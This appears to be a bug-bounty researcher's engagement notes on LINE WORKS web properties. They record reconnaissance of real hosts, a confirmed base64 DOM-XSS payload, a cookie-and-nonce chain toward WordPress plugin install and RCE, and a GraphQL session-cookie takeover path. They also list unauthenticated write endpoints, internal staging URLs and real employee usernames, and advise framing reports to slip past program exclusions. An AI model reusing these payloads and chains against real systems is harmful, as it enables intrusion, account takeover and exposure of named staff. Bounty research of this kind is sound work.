# LINE WORKS Engagement Intel (IssueHunt, June 2026)

## Program
- Platform: IssueHunt
- URL: https://issuehunt.io/programs/d7c3def6-9500-469d-b114-e5dd71d39621
- Company: LINE WORKS (LY Corporation subsidiary, Naver ecosystem)
- Rewards: ¥5,000 - ¥300,000 (JPY)

## Scope
- Web: line-works.com, *.line-works.com (wildcard)
- Mobile: LINE WORKS iOS/Android/Windows/macOS

## Findings (June 2026)
1. CVE-2022-29455 DOM XSS via Elementor Lightbox (line-works.com) — Medium. Requires click on crafted link. Confirmed in browser (alert fires, returns "line-works.com"). Cookies are marketing-only (worksmobile.com has sessions).
2. Unauthenticated GraphQL introspection + write ops (cxtalk-service.line-works.com/jp1/gquery) — Medium. 35 types, batch_send_message reaches backend. Also on /jp2/, alpha-cxtalk, kr1-alpha-cxtalk.
3. NELO log injection (jp-col-ext.nelo.navercorp.com/_store, project P6349d1_cstalk_connect) — Medium-High. Arbitrary write, all severity levels, bulk, XSS in body accepted. Project name from JS bundle.
4. Internal infrastructure URL disclosure (21 alpha/dev URLs in /jp1/invite HTML). alpha-alice.worksmobile.com Swagger UI accessible. alpha-cxtalk GraphQL accessible (no WAF).

## Key Lessons
- cxtalk-service root returns "Invalid Path" (12 bytes) — looks dead but /jp1/ prefix has full app
- JS bundle at /jp1/dist/history/history.main-*.js (2MB) contains 145 API paths + NELO project names
- Cookies are on worksmobile.com domain, XSS on line-works.com cannot steal sessions (different domain)
- WP Fastest Cache 0.9.9 SQLi (CVE-2023-6063) NOT exploitable — nginx static serving bypasses PHP
- Program excludes "Exposing application info on server" — frame findings as write access / broken access control

## Infrastructure
- line-works.com: WordPress 5.x + nginx, Elementor 3.5.6, Elementor Pro 3.6.3, WP Fastest Cache 0.9.9, Redirection (110.234.239.6)
- lp.line-works.com: WordPress 6.3.1 + nginx, Elementor 3.15.3, WP Fastest Cache 1.2.2 (patched)
- cxtalk-service.line-works.com: Cloudflare → OpenResty/Lua backend. Root returns "Invalid Path" BUT /jp1/ and /jp2/ prefixes expose full chat application
- jp1-cstalk.worksmobile.com: OpenResty backend (no CDN), direct access to chat APIs
- alpha-cxtalk.worksmobile.com: Staging env, server: nfront-stage, no WAF, GraphQL exposed
- kr1-alpha-cxtalk.worksmobile.com: Internal backend, publicly routable, GraphQL works
- alpha-alice.worksmobile.com: AI/Bot admin service, Spring Boot, Swagger UI accessible
- go/pages: Marketo/Cloudflare (403 pages)
- mkt/mkt.tw: Pardot/Salesforce (302 → line-works.com)
- DNS: Naver NS, no wildcard, zone transfer refused
- CDN: Akamai (worksmobile.com services), Cloudflare (cxtalk-service only)

## Key Finding: Actual Attack Surface is on cxtalk-service

Despite appearing "empty" on root path (returns "Invalid Path" 400), the cxtalk-service subdomain hosts a full chat application under region prefixes (/jp1/, /jp2/). This is the primary attack surface.

### Accessible Endpoints (cxtalk-service.line-works.com/jp1/)
- `/jp1/gquery` — Unauthenticated GraphQL with full introspection (43 types, 13 operations)
- `/jp1/invite`, `/jp1/history`, `/jp1/join` — Frontend pages leaking alpha/dev config (21 internal URLs)
- `/jp1/p/cxtalk/csTalkHistory/detail/list` — Chat history API (needs cookie)
- `/jp1/p/oneapp/client/cstalk/*` — Customer service APIs (needs cookie)
- `/jp1/dist/history/history.main-*.js` — 2MB JS bundle with API routes, NELO project names

### NELO Logging (Naver internal)
- Endpoint: `jp-col-ext.nelo.navercorp.com/_store` (publicly writable)
- Project: `P6349d1_cstalk_connect` (accepts arbitrary logs without auth)
- Other projects: P84f543_cstalk_userdata, P95625c_cstalk_jserror, P275bc3_cstalk_pageload (require key)

### Alpha/Staging Services (publicly accessible)
- alpha-cxtalk.worksmobile.com — GraphQL, server: nfront-stage
- kr1-alpha-cxtalk.worksmobile.com — Same GraphQL, internal backend
- alpha-alice.worksmobile.com — AI/Bot admin, Swagger UI at /api/swagger-ui/index.html, "AdminAPI-rest" spec

## XSS Exploitation Details (CVE-2022-29455)

**Trigger mechanism:** NOT auto-fire from URL hash. Requires click on a link with `href="#elementor-action:..."`. The `runHashAction()` method looks for a DOM element with matching `e-action-hash` attribute — won't fire on bare page load.

**Correct attack vector:**
1. Attacker page with `<a href="https://line-works.com/#elementor-action:action=lightbox&settings=BASE64">Click</a>`
2. OR inject link via any input that renders on line-works.com
3. jQuery click event triggers `runLinkAction()` → `runAction()` → `lightbox.showModal({type:"html", html:"PAYLOAD"})`

**Verified payload (confirmed in browser):**
```
#elementor-action:action=lightbox&settings=eyJ0eXBlIjoiaHRtbCIsImh0bWwiOiI8aW1nIHNyYz1odHRwczovL2ludmFsaWQuaW52YWxpZC94LnBuZyBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+In0=
```
Decoded: `{"type":"html","html":"<img src=https://invalid.invalid/x.png onerror=alert(document.domain)>"}`

**Cookie scope limitation:** XSS fires on `line-works.com` but LINE WORKS session cookies live on `worksmobile.com` (different root domain). Cannot steal app session cookies cross-domain. Impact limited to:
- Phishing overlays (fake login form in lightbox)
- Marketing cookie theft (Marketo, HubSpot, GA tokens)
- Redirect to attacker-controlled site
- Cannot chain with GraphQL (cxtalk uses worksmobile.com cookies)

**Key gotcha for src attribute:** `src="x"` resolves to `https://line-works.com/x` which returns a valid response (WordPress 404 page has content), so `onerror` may NOT fire. Use `src=https://invalid.invalid/x.png` (guaranteed DNS failure) for reliable trigger.

## Findings (June 2026)
| # | Severity | Title | Asset |
|---|----------|-------|-------|
| F1 | Medium | CVE-2022-29455 DOM XSS via Elementor Lightbox | line-works.com |
| F2 | Medium | Internal Infrastructure URL Disclosure + Alpha Services | cxtalk-service /jp1/ |
| F3 | Medium | Unauthenticated GraphQL Introspection + Write Operations | cxtalk-service /jp1/gquery |
| F4 | Medium-High | Unauthenticated Log Injection to NELO | jp-col-ext.nelo.navercorp.com |
| F5 | Medium | Nginx Case-Sensitivity Bypass on WP REST API | line-works.com, lp.line-works.com |
| F6 | Low | WP CORS Reflects Any Origin + Credentials | line-works.com |
| F7 | Low | WordPress User Enumeration via author param | lp.line-works.com |

## Attack Chain (Full Takeover Path — Proven June 2026)

**Chain: XSS → WP Admin API → Potential RCE**

Each link independently verified:
1. ✅ DOM XSS fires on line-works.com (Elementor 3.5.6, `runHashAction` present)
2. ✅ Nginx bypass: `/wp-json/wp/v2/Users` = 403, `/wp-json/wp/v2/Users` (capital U) = 401
3. ✅ ALL WP REST endpoints reachable via case bypass: Users, Posts, Pages, Comments, Categories, Tags, Media, Plugins, Themes, Settings, Templates, Menus, Taxonomies, Types, Statuses, Block-types, Search
4. ✅ WP CORS reflects ANY origin with `access-control-allow-credentials: true`
5. ✅ WP REST API returns `rest_not_logged_in` (not `rest_forbidden`) — accepts cookie+nonce auth
6. ✅ `wpApiSettings` with nonce present in authenticated page HTML
7. ✅ admin-ajax.php alive (heartbeat returns `server_time`)

**Chain execution (requires victim WP admin to click XSS link):**
```
XSS on line-works.com
→ JS reads wpApiSettings.nonce from page
→ fetch('/wp-json/wp/v2/Users', {credentials:'include', headers:{'X-WP-Nonce': nonce}})
  (uses capital U to bypass nginx 403)
→ Full user list with emails, roles
→ fetch('/wp-json/wp/v2/Plugins', ...) → install malicious plugin → RCE
```

**Secondary chain: GraphQL messaging takeover**
```
XSS on cxtalk-service.line-works.com (if achievable)
→ Steal NEOSES cookie
→ GraphQL batch_send_message/batch_join_chat/domain_contacts_get
→ Read all contacts, send messages as victim, join private channels
```

**Limitations:**
- XSS needs victim click (DOM XSS, not reflected)
- WP cookies are on line-works.com (same domain as XSS ✓)
- GraphQL chain requires NEOSES cookie from worksmobile.com (cross-domain, not directly chainable with line-works.com XSS)

## Nginx Case-Sensitivity Bypass (F5 Detail)

Nginx rules block lowercase WP REST paths but WordPress routing is case-insensitive:

| Path | nginx | WordPress |
|------|-------|-----------|
| /wp-json/wp/v2/users | 403 (blocked) | — |
| /wp-json/wp/v2/Users | PASSES (401) | Matches route |
| /wp-json/wp/v2/media | 403 (blocked) | — |
| /wp-json/wp/v2/Media | PASSES (401) | Matches route |
| /wp-json/wp/v2/plugins | 401 (not blocked!) | Matches route |
| /xmlrpc.php | 403 (blocked) | — |
| /XMLRPC.php | 404 | Case-sensitive filesystem |

**Affected:** line-works.com AND lp.line-works.com (same nginx config)
**Not bypassed:** xmlrpc.php (filesystem is case-sensitive), wp-login.php (404 on case variants)

## GraphQL Escalation (F3 Update — June 2026)

Additional impact confirmed during Phase 6 escalation:
- **Unlimited batch queries:** 20 parallel operations, 0.78s, no rate limiting
- **No query depth/complexity limits:** 12KB nested introspection in 0.7s
- **Pre-auth Lua execution:** `batch_forward_message` triggers `attempt to index field 'target'` before cookie check
- **Multiple auth layers exposed:** `PERMISSION_DENINED` (returnCode 60) vs "Cookie error" — different backends
- **Both JP regions:** `/jp1/gquery` and `/jp2/gquery` both fully exposed

## Additional Findings (Phase 6, June 2026)

5. **CORS Arbitrary Origin + credentials:true** — Both line-works.com and lp.line-works.com reflect any Origin including `null` with `access-control-allow-credentials: true`. Low-Med (needs nonce for exploitation).
6. **WordPress User Enumeration (lp.line-works.com)** — 9 real usernames via `?author=N`: gdc_admin, hwayeob, lee-yeonjae, jh-ryu, mari-ishisaka, keitaro-matsuo, haruna-tanaka, soyoung-yoon2, kim-jiyun.
7. **Host Header Injection → Open Redirect** — `GET / + Host: evil.com` → `302 Location: https://evil.com/jp/en/`. Root path only, not cached, not on subpaths.
8. **CDN Alternate Origin (pstatic)** — `line-works.pstatic.net` serves same WP without all nginx blocks. `/wp-json/wp/v2/Users` returns 401 (no case bypass needed). `wp-config-sample.php` triggers PHP 500 (PHP executes on CDN).

## Full Attack Chain (proven minus victim click)
XSS(F1) → steal WP nonce+cookies → nginx bypass(F5/CDN F8) → full REST API (Users/Plugins/Themes/Settings) → plugin install → RCE
Secondary: XSS → steal NEOSES cookie → GraphQL batch_send_message/batch_join_chat (F3)

## Exhausted Vectors (negative)
SQLi (WPFC CVE), SSRF (planetlink/oembed), CRLF, reflected XSS (search/RSS/Atom), cache poisoning, open redirect (go/pages/mkt), xmlrpc case bypass (404), registration, subdomain takeover, Lua injection, web cache deception, Elementor form abuse, password reset poisoning, wp-cron, wp-comments-post
- **Both JP regions:** /jp1/gquery and /jp2/gquery both vulnerable
- **Alpha has NO cookie check:** alpha-cxtalk.worksmobile.com returns data without "Cookie error" in _rawdata_

## lp.line-works.com User Enumeration (F7 Detail)

| author ID | Username |
|-----------|----------|
| 1 | gdc_admin |
| 2 | hwayeob |
| 5 | lee-yeonjae |
| 10 | keitaro-matsuo |
| 19 | soyoung-yoon2 |
| 20 | kim-jiyun |

## Submission Strategy
- F2 excluded standalone ("Exposing application info on server") — chain as supporting evidence in F3
- F3 framed as "Broken Access Control" not "information disclosure"
- F4 framed as "Unauthorized Write Access" — clearly not info-only
- 3 reports total: F1 standalone, F3+F2 chain, F4 standalone

## Security Posture
### line-works.com (WordPress — hardened but outdated)
- wp-json REST: 401 (requires auth)
- xmlrpc.php: 403 (nginx blocks)
- wp-login.php: redirects
- User enum via ?author=N: blocked on line-works.com, WORKS on lp.line-works.com (gdc_admin, hwayeob, lee-yeonjae, jh-ryu, mari-ishisaka)
- Elementor 3.5.6: VULNERABLE to CVE-2022-29455 (DOM XSS)
- WP Fastest Cache 0.9.9: CVE-2023-6063 NOT exploitable (static serving bypasses PHP query)
- admin-ajax.php: accessible, heartbeat works, elementor_pro_forms_send_form returns validation errors

### cxtalk-service (OpenResty/Lua — weak auth model)
- Auth: cookie-based (NEOSES + worksLoc), checked at APPLICATION layer not gateway
- GraphQL: NO auth on introspection or query execution
- NELO logging: NO auth on P6349d1_cstalk_connect project
- Alpha services: NO WAF, publicly routable

## Tested Vectors (Negative)
- CVE-2023-6063 (WP Fastest Cache SQLi): no time-based delay, static serving bypasses PHP
- CORS: no reflection on any endpoint
- Path traversal on cxtalk-service: filtered by OpenResty
- SSRF via planetlink/readplanetlink: requires cookie
- GraphQL IDOR (channel enumeration): identical responses regardless of channelNo
- Subdomain takeover: all CNAMEs resolve (Marketo, Pardot active)
- WP user enum on line-works.com: redirects to root (blocked)

## Lesson
**NEVER dismiss a host based on root-path response alone.** cxtalk-service returned "Invalid Path" on `/` but hosted an entire chat application under `/jp1/`. The 5-minute gobuster run that was initially skipped would have found this immediately. Region-prefix patterns (/jp1/, /jp2/, /kr1/) are common in Asian enterprise services — always test them.

## GitHub Org
- github.com/worksmobile (19 repos — iOS SDKs, MQTT, mail libs)

## Android Packages (from assetlinks.json)
- com.gworks.oneapp.works (prod/stage/debug)
- com.gworks.oneapp.naverworks (prod/stage/debug)
- com.gworks.oneapp.ncs (prod/stage/debug)
- com.gworks.oneapp.naverworks.gov (prod/stage/debug)
